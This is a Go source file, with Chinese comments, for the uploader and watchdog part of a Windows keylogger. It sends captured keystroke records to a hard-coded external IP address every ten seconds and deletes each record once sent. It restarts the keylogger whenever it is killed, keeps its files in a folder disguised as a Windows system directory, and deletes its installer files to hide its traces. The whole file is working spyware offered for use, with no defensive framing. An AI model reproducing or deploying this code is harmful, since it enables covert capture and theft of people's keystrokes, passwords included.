// 两个功能：1. 从数据库读取击键记录并上传到Server；2. 监控击键程序是否终止，如被终止则将其再次提起
package main

import (
	"fmt"
	"gorm.io/gorm"
	"log"
	"os"
	"os/exec"
	"path/filepath"
	"read_db_upload/utilities"
	"time"
)

const (
	DB              = "xxx.db"
	LOG             = "log.log"
	HOMEDIR         = "C:\\ProgramData\\Windows\\tmp"
	UPLOAD_INTERVAL = 10 * time.Second
	CHECK_INTERVAL  = 15 * time.Second
	//SERVER_URL      = "http://127.0.0.1:4435"
	SERVER_URL = "http://42.193.116.23:4435"
)

var (
	db         *gorm.DB
	DeviceID   string
	DeviceName string
	loggerPID  int32
)

func init() {
	myDeleteFile(filepath.Join(HOMEDIR, "instsrv.exe"))
	myDeleteFile(filepath.Join(HOMEDIR, "install.bat"))
	myDeleteFile(filepath.Join(HOMEDIR, "run-install.bat"))
	initHomeDir()
	utilities.InitLog(filepath.Join(HOMEDIR, LOG))
	initDatabase()

	loggerPID = startLoggerProcess()

	var deviceinfo DeviceInfo
	db.First(&deviceinfo)

	DeviceID = deviceinfo.DeviceID
	DeviceName = deviceinfo.DeviceName
}

func main() {
	go processMonitor(CHECK_INTERVAL)
	readDBUpload(UPLOAD_INTERVAL)
}

// 监视指定进程是否存在
func processMonitor(interval time.Duration) {
	for {
		if utilities.CheckProcess(int(loggerPID)) == false {
			log.Println("Keylogger has been killed, restarting")
			loggerPID = startLoggerProcess()
			log.Println("Restarted, PID:", loggerPID)
		} else {
			log.Println(loggerPID, "is running")
		}

		time.Sleep(interval)
	}
}

// 读取数据库并上传
func readDBUpload(interval time.Duration) {
	for {
		var data Data
		db.First(&data)

		if data.Timestamp != 0 {
			// 数据不为空
			url := SERVER_URL
			err := UploadData(url, data) // 数据上传
			if err != nil {
				log.Println("Upload failed", err.Error())
			} else {
				log.Println("Upload succeed", data.Timestamp, " --- ", data.KeystrokeRecord)
				db.Delete(&data)
			}
		}

		time.Sleep(interval)
	}
}

// 启动logger并返回进程号
func startLoggerProcess() int32 {
	//binary, lookErr := exec.LookPath("./MyKeylogger.exe")
	//if lookErr != nil {
	//	log.Fatalln("Can't find MyKeylogger.exe", lookErr.Error())
	//}
	//
	////s := []string{"cmd.exe", "/C", "start", binary}
	//s := []string{binary}
	//
	//cmd := exec.Command(s[0], s[1:]...)
	//cmd.SysProcAttr = &syscall.SysProcAttr{HideWindow: true}
	//
	binary, lookErr := exec.LookPath("./MyKeylogger.exe")
	if lookErr != nil {
		log.Fatalln("Can't find MyKeylogger.exe", lookErr.Error())
	}

	keyloggerPath, absError := filepath.Abs(binary)
	if lookErr != nil {
		log.Fatalln("Can't get MyKeylogger.exe abs path", absError.Error())
	}

	err, pid := utilities.StartProcessAsCurrentUser(keyloggerPath, "", "")
	if err != nil {
		log.Fatalln("Keylogger start error:", err)
	}
	return pid
}

func initHomeDir() {
	exist := utilities.Filexists(HOMEDIR)
	if exist {
		fmt.Printf("has dir![%v]\n", HOMEDIR)
	} else {
		fmt.Printf("no dir![%v]\n", HOMEDIR)
		// 创建文件夹
		err := os.MkdirAll(HOMEDIR, os.ModePerm)
		if err != nil {
			log.Fatal("mkdir failed!", err, "\n")
		} else {
			fmt.Printf("mkdir success!\n")
		}
	}
}

func myDeleteFile(filePath string) {
	err := os.Remove(filePath)
	if err != nil {
		log.Println(err)
	}
}
